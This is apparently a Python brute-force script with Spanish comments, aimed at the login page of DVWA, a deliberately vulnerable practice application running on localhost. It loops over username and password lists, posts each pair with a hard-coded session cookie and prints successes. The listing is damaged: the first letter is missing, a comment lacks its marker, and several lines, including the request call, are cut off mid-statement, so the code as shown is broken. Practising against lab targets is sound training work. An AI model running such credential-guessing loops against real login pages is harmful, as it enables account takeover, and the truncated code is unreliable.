mport requests
from bs4 import BeautifulSoup

# URL de la sección de vulnerabilidad de fuerza bruta de DVWA
url = 'http://localhost:4280/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36>
    'Content-Type': 'application/x-www-form-urlencoded'
}
 Cookies de autenticación necesarias para DVWA (supone que ya has iniciado ses>
cookies = {
    'PHPSESSID': '841f251197d5f64456b3c2f0df2dbf99',
    'security': 'low'  # Nivel de seguridad bajo en DVWA
}
def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Función para realizar el ataque de fuerza bruta
def brute_force_attack():
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)

    for username in users:
        for password in passwords:
            # Realizar la solicitud POST con la combinación de usuario/contrase>
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            response = requests.post(url, headers=headers, cookies=cookies, par>


            # Analizar la respuesta para verificar si se ha iniciado sesión con>
            soup = BeautifulSoup(response.text, 'html.parser')

            # Verificar el contenido de la página para encontrar el mensaje cor>
            if 'Welcome to the password protected area' in soup.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
            else:
                print(f'[FAILED] Usuario: {username} Contraseña: {password}')

# Ejecutar el ataque de fuerza bruta
brute_force_attack()



